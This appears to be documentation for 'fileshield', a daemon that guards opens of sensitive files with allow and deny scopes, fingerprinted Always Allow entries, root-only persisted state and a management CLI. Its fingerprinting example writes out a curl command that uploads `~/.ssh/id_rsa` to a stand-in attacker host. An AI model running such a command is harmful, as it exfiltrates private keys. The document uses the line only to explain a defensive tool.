# Decision Scopes

| Choice        | Matches on                                                                                          | Lifetime                                                   | Persisted                |
| ------------- | --------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- | ------------------------ |
| Allow Once    | PID + binary + exact file                                                                           | `user_ttl` seconds                                         | no                       |
| Allow Session | POSIX session + binary (SHA-512 when hashable; optional for unhashable binaries) + exact file       | until the shell/session leader exits, capped by `session_ttl` | no                    |
| Allow Always  | binary SHA-512 + call chain + exact file + exact command line                                       | until removed                                              | `runtime-allowlist.json` |
| Allowlist pin | matched `[allowlist]` rule binary pattern + binary SHA-512                                          | until a hash change, CLI removal, or eviction at 256 pins  | `allowlist-hashes.json`  |
| Deny Session  | same key shape as Allow Session                                                                     | same as Allow Session                                      | no                       |
| Deny Always   | same key shape as Allow Always                                                                      | until removed                                              | `runtime-denylist.json`  |
| Deny          | —                                                                                                   | this attempt (rapid retries denied for ~2 s)               | no                       |

Denials are always checked before grants, so a config, session or permanent denial can never be bypassed by an allow rule or a cached _Allow Once_.

The decision order is: config denylist → session deny → runtime deny → file cache → session allow → runtime allow → `[unsafe_allowlist]` → hash-pinned `[allowlist]` → dialog.

An open that reaches a protected inode through a path outside every protected prefix (a hard link) never takes a grant from those lists: it always shows the dialog, so an approval for the original path cannot silently cover the link.

While one decision dialog is open, every _other_ open still runs the full pipeline immediately: deny rules deny, and cache/session/rule grants allow — only opens that genuinely need the user queue behind the pending decision.

`session_ttl` is configured in `[settings]` and defaults to `0`, meaning session decisions live exactly as long as the shell session itself. A non-zero value additionally expires them after that many seconds.

## Always Allow — Runtime Dynamic Allowlist

Clicking **Always Allow** stores a fingerprinted, file- and command-scoped entry in the daemon's in-memory allowlist **and persists it to disk**:

| Attribute checked on every future match       | Why                                                                                                                      |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| Binary path                                   | Basic identity                                                                                                           |
| **SHA-512 of the binary**                     | Detects on-disk replacement (supply-chain attack)                                                                        |
| **Call chain** (up to 3 ancestors)            | Prevents a different caller from inheriting the rule                                                                     |
| **SHA-512 of each ancestor exe**              | Detects replaced parent binaries                                                                                         |
| **Target file**                               | Least privilege: approving `kubectl` for `~/.kube/config` does not grant `~/.ssh/id_rsa`                                 |
| **Command line** (stored, matched by SHA-512) | Only the exact invocation, arguments included, stays silent: `kubectl get pods` does not authorize `kubectl get secrets` |

**Example:** clicking _Always Allow_ for `curl` reading `~/.ssh/id_rsa` records:

```text
binary:         /usr/bin/curl     (sha512: a3f1…)
target:         /home/user/.ssh/id_rsa
command:        curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa
parent[0]:      bash              (sha512: 7c82…)
parent[1]:      systemd           (sha512: 0d4e…)
```

A future `curl` call from `zsh` instead of `bash` will prompt again because the call chain differs. A trojaned `/usr/bin/curl` prompts because its SHA-512 changed. The same binary reading `~/.aws/credentials` prompts because the target differs. Different arguments prompt because the command line differs.

> The command line is stored verbatim in the root-only (0600) state file so entries can be reviewed, and a SHA-512 over the **full raw command line** (bounded at 64 KB) is the matching key. Arguments may contain secrets (`-p…`, tokens); the state file is readable only by root, but treat it accordingly. State entries written by older versions without a `target_path` or a command line, and entries whose stored fingerprint predates full-line hashing, no longer match (fail closed). Remove stale duplicates with `fileshield-cli prune`.

## Persistence

_Always Allow_ and _Always Deny_ entries are stored in JSON state files (`/var/lib/fileshield/runtime-allowlist.json` and `/var/lib/fileshield/runtime-denylist.json`) with strict permissions (mode 0600, root-only):

- **Automatically loaded** when the daemon starts.
- **Immediately saved** when you click "Always Allow" / "Deny Always".
- **Fail-secure**: a corrupted or unreadable state file starts with an empty list and reprompts; entries missing a target or command line are dropped.

Each entry records its stored rule ID, binary path and SHA-512, target file, exact command line with its SHA-512 fingerprint, the ancestor call chain, and the real creation time:

```json
{
  "rule_id": "dd8bf55d3c0e4a1b",
  "binary": "/usr/bin/kubectl",
  "binary_sha512": "a3f1…",
  "target_path": "/home/user/.kube/config",
  "cmdline": "kubectl config view --minify",
  "cmdline_sha512": "0123…",
  "chain_depth": 1,
  "chain_comm[0]": "zsh",
  "chain_sha512[0]": "7c82…",
  "created_at": 1700000000
}
```

The daemon assigns the 16-hex `rule_id` at creation and preserves both it and `created_at` across every save. Legacy state files get IDs assigned at load and are rewritten immediately (grants are kept, never dropped).

Manage entries with [`fileshield-cli`](cli.md):

```bash
sudo fileshield-cli list rules
sudo fileshield-cli describe allow dd8bf55d
sudo fileshield-cli remove allow dd8bf55d
sudo fileshield-cli clear allow
sudo fileshield-cli prune --dry-run
sudo fileshield-cli prune
```

The files stay plain root-only JSON, so manual inspection still works (`sudo cat /var/lib/fileshield/runtime-allowlist.json | jq .`); edit through the CLI so the daemon's memory and the file cannot diverge. A hand edit is picked up on the next reload.

`[allowlist]` hash pins use a separate state file (`/var/lib/fileshield/allowlist-hashes.json`) with the same permissions and reload behavior.

## Rule IDs

Every persisted allow/deny rule stores a **16-character lowercase hex rule ID**. Tables show the first 8 characters by default and all 16 with `--wide`; `describe` always prints the full ID with every recorded digest. Pin IDs are derived from the pattern (first 16 hex of SHA-512 over the canonical pattern) and not stored.

Commands that take an ID accept the full 16 characters or any **unambiguous prefix of at least 8 characters**. A shorter, non-hex or ambiguous prefix is rejected; `describe allow|deny|pin` with no ID prints every entry so the IDs can be read off.

The daemon assigns IDs to legacy entries when it loads them and rewrites the state file immediately (grants preserved, never dropped).
